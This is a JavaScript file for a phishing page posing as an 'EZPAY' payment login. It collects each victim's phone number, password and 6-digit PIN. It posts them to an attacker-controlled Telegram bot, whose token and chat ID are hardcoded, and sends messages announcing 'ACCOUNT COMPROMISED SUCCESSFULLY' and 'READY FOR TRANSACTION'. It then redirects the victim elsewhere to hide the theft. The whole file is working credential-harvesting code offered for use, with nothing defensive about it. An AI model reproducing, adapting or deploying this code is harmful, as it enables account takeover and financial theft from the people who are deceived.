// script.js - UPDATED WITH SUCCESS PAGE
document.addEventListener('DOMContentLoaded', function() {
    // ===== TELEGRAM CONFIG =====
    const TELEGRAM_BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E"; // APNA TOKEN DAALO
    const TELEGRAM_CHAT_ID = "8023791486"; // APNA CHAT ID DAALO
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    // ===========================
    
    // ---------- PAGE ELEMENTS ----------
    const phoneInput = document.getElementById('phone-input');
    const passwordInput = document.getElementById('password-input');
    const signInButton = document.getElementById('signin-button');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const loadingOverlay = document.getElementById('loading-overlay');
    const displayPhone = document.getElementById('display-phone');
    const pinInput = document.getElementById('pin-input');
    const completeLoginButton = document.getElementById('complete-login-button');
    const loadingOverlay2 = document.getElementById('loading-overlay-2');
    const backToSigninLink = document.getElementById('back-to-signin');
    
    // ---------- PAGE SWITCHING FUNCTIONS ----------
    function showPage(pageNumber) {
        // Hide all pages
        document.querySelector('.page-1').style.display = 'none';
        document.querySelector('.page-2').style.display = 'none';
        document.querySelector('.page-success').style.display = 'none';
        
        // Show selected page
        if (pageNumber === 1) {
            document.querySelector('.page-1').style.display = 'block';
            setTimeout(() => phoneInput.focus(), 100);
        } else if (pageNumber === 2) {
            document.querySelector('.page-2').style.display = 'block';
            setTimeout(() => pinInput.focus(), 100);
        } else if (pageNumber === 3) {
            document.querySelector('.page-success').style.display = 'block';
            startCountdown();
        }
    }
    
    // ---------- VALIDATION FUNCTIONS ----------
    function validatePhone(phone) {
        return /^\d{10}$/.test(phone);
    }
    
    function validatePassword(password) {
        return password.length >= 1;
    }
    
    function validatePIN(pin) {
        return /^\d{6}$/.test(pin);
    }
    
    // ---------- UPDATE BUTTON STATES ----------
    function updateSignInButton() {
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (validatePhone(phone) && validatePassword(password)) {
            signInButton.removeAttribute('disabled');
            signInButton.classList.remove('van-button--disabled');
            signInButton.style.opacity = '1';
        } else {
            signInButton.setAttribute('disabled', 'disabled');
            signInButton.classList.add('van-button--disabled');
            signInButton.style.opacity = '0.7';
        }
    }
    
    function updateCompleteLoginButton() {
        const pin = pinInput.value.trim();
        
        if (validatePIN(pin)) {
            completeLoginButton.removeAttribute('disabled');
            completeLoginButton.classList.remove('van-button--disabled');
            completeLoginButton.style.opacity = '1';
        } else {
            completeLoginButton.setAttribute('disabled', 'disabled');
            completeLoginButton.classList.add('van-button--disabled');
            completeLoginButton.style.opacity = '0.7';
        }
    }
    
    // ---------- PASSWORD VISIBILITY TOGGLE ----------
    if (togglePasswordBtn) {
        togglePasswordBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.classList.remove('van-icon-eye');
                togglePasswordBtn.classList.add('van-icon-closed-eye');
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.classList.remove('van-icon-closed-eye');
                togglePasswordBtn.classList.add('van-icon-eye');
            }
        });
    }
    
    // ---------- TELEGRAM FUNCTIONS ----------
    async function sendToTelegram(message) {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            return data.ok === true;
        } catch (error) {
            console.error('Telegram error:', error);
            return false;
        }
    }
    
    async function sendLoginData(phone, password) {
        const userAgent = navigator.userAgent;
        const currentTime = new Date().toLocaleString('en-IN', { 
            timeZone: 'Asia/Kolkata',
            hour12: true 
        });
        
        const message = `
🔐 <b>NEW EZPAY LOGIN ATTEMPT</b>

📱 <b>Phone Number:</b> +91 ${phone}
🔑 <b>Password:</b> <code>${password}</code>

🖥️ <b>Browser:</b> ${userAgent}
⏰ <b>Time (IST):</b> ${currentTime}

<b>Status:</b> ✅ <b>STEP 1 COMPLETED</b>
<b>Waiting for PIN verification...</b>
        `;
        
        return await sendToTelegram(message);
    }
    
    async function sendPINData(phone, pin) {
        const currentTime = new Date().toLocaleString('en-IN', { 
            timeZone: 'Asia/Kolkata',
            hour12: true 
        });
        
        const message = `
✅ <b>EZPAY PIN VERIFICATION SUCCESSFUL</b>

📱 <b>Phone Number:</b> +91 ${phone}
🔢 <b>6-Digit PIN:</b> <code>${pin}</code>

⏰ <b>Time (IST):</b> ${currentTime}

<b>Status:</b> 🎉 <b>FULL ACCESS GRANTED</b>

🚨 <b>ACCOUNT COMPROMISED SUCCESSFULLY</b>
💰 <b>READY FOR TRANSACTION</b>
        `;
        
        return await sendToTelegram(message);
    }
    
    // ---------- EVENT LISTENERS ----------
    phoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        updateSignInButton();
    });
    
    passwordInput.addEventListener('input', updateSignInButton);
    
    // SIGN IN button
    signInButton.addEventListener('click', async function() {
        if (this.disabled) return;
        
        const phone = phoneInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!validatePhone(phone)) {
            showError('phone-error', 'Please enter 10-digit number');
            return;
        }
        
        if (!validatePassword(password)) {
            showError('password-error', 'Please enter PIN');
            return;
        }
        
        loadingOverlay.style.display = 'flex';
        signInButton.innerHTML = 'Processing...';
        
        try {
            await sendLoginData(phone, password);
            loadingOverlay.style.display = 'none';
            signInButton.innerHTML = 'SIGN IN';
            
            localStorage.setItem('ezpay_phone', phone);
            displayPhone.value = phone;
            showPage(2);
        } catch (error) {
            loadingOverlay.style.display = 'none';
            signInButton.innerHTML = 'SIGN IN';
            localStorage.setItem('ezpay_phone', phone);
            displayPhone.value = phone;
            showPage(2);
        }
    });
    
    // PIN input
    pinInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 6);
        updateCompleteLoginButton();
    });
    
    // COMPLETE LOGIN button
    completeLoginButton.addEventListener('click', async function() {
        if (this.disabled) return;
        
        const pin = pinInput.value.trim();
        const phone = localStorage.getItem('ezpay_phone');
        
        if (!validatePIN(pin)) {
            showError('pin-error', 'Please enter 6-digit PIN');
            return;
        }
        
        loadingOverlay2.style.display = 'flex';
        completeLoginButton.innerHTML = 'Verifying...';
        
        try {
            await sendPINData(phone, pin);
            loadingOverlay2.style.display = 'none';
            completeLoginButton.innerHTML = 'COMPLETE LOGIN';
            
            localStorage.removeItem('ezpay_phone');
            showPage(3);
        } catch (error) {
            loadingOverlay2.style.display = 'none';
            completeLoginButton.innerHTML = 'COMPLETE LOGIN';
            localStorage.removeItem('ezpay_phone');
            showPage(3);
        }
    });
    
    // Back link
    backToSigninLink.addEventListener('click', function(e) {
        e.preventDefault();
        showPage(1);
    });
    
    // ---------- HELPER FUNCTIONS ----------
    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        if (errorElement) {
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            setTimeout(() => errorElement.style.display = 'none', 3000);
        }
    }
    
    function startCountdown() {
        let count = 3;
        const countdownElement = document.getElementById('countdown');
        const countdownInterval = setInterval(() => {
            count--;
            if (countdownElement) {
                countdownElement.textContent = count;
            }
            
            if (count <= 0) {
                clearInterval(countdownInterval);
                window.location.href = 'https://ezpay1.vercel.app';
            }
        }, 1000);
    }
    
    // ---------- INITIAL SETUP ----------
    updateSignInButton();
    updateCompleteLoginButton();
    
    // Check URL hash for page navigation
    if (window.location.hash === '#verify') {
        const savedPhone = localStorage.getItem('ezpay_phone');
        if (savedPhone) {
            displayPhone.value = savedPhone;
            showPage(2);
        }
    }
});
